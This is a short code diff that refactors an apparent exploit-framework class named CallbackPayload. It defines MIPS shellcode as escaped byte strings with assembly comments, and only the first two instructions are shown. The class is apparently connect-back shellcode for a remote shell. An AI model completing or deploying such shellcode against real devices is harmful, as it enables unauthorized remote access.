@@ -19,11 +19,10 @@ import string
 import socket
 import signal
 import os
+from ...common.support import BigEndian,LittleEndian
 
 class CallbackPayload:
-    BigEndian,LittleEndian=range(2)
-    shellsize = 184
-    shellcodes = [BigEndian,LittleEndian]
+    shellcodes = {}
     shellcodes[LittleEndian]=string.join([
         "\xfa\xff\x0f\x24", # li    t7,-6
         "\x27\x78\xe0\x01", # nor   t7,t7,zero
